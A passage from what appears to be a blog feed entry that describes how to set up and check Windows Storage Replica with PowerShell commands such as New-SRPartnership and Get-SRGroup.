+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;New-SRPartnership -SourceComputerName &amp;lt;Name&amp;gt; -SourceRGNName &amp;lt;Name&amp;gt; Source RG -sourceVolumeName &amp;lt;Drive Letter&amp;gt; -SourceLogVolumeName &amp;lt;Letter for replica&amp;gt; DestinationRG -DestinationVolume &amp;lt;Drive Letter&amp;gt; DestinationLogVolume &amp;lt;Drive Letter&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;SRPartnership is the relationship between two machines with Storage Replica running. This command creates that relationship.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: if you use computer names in this, you will need to make sure your DNS is working. Otherwise you can use IP addresses&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Run the commanlet and wait for it to complete with an output of the summary.&lt;/p&gt;
+
+&lt;p&gt;To check to see if your Storage Replica is working you can run this Powershell command:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(Get-SRGroup).Replicas | Select-Object Numofbyesremaining
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It will show how many bytes are left as it copies itself over.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Storage Replicas are great in combination with Failover to allow for a strong redudant system.&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Software Defined Storage &amp;amp; Storage Pools Storage Pools and Storage spaces helps an admin to manage the storage infrastructure with in an enterprise environment. Before installing and configuring here is a quick overview.</summary></entry></feed>
